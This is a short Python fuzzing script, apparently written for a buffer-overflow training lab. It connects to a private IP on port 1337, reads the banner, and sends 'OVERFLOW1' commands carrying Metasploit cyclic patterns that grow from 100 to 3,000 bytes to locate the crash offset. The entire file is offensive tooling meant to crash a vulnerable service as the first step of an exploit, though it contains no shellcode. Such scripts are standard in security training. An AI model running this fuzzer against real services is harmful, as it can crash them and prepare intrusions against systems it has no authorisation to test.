#!/usr/bin/python3

import socket
import time
import sys
import os


ip = "10.10.235.43"
port = 1337
timeout = 5
create_pattern_ruby = "ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb"

def send(msgstr, expectResponse=False, responseLen=1024):
    try:
        cmd = msgstr.encode('raw_unicode_escape')
        length = len(cmd)
        print(f"Sending {length} Bytes")
        s.send(cmd)
        if expectResponse:
            return s.recv(responseLen)
        else:
            pass
    except:
        print(sys.exc_info())

# Create an array of increasing length buffer strings.
buffer = []
counter = 100
while len(buffer) < 30:
    stream = os.popen(f"{create_pattern_ruby} -l {counter}")
    pattern = stream.read()
    # print(f"Pattern: {pattern}")
    buffer.append(pattern)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))

        # grab banner and display
        banner = s.recv(1024)
        print(f"Banner: {banner}")

        cmd = f"OVERFLOW1 {string}\r\n"
        response = send(cmd, True)
        print(f"Response: {response}")

        print("Send EXIT")
        cmd = "EXIT\r\n"
        response = send(cmd, True)
        print(f"Response: {response}")
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)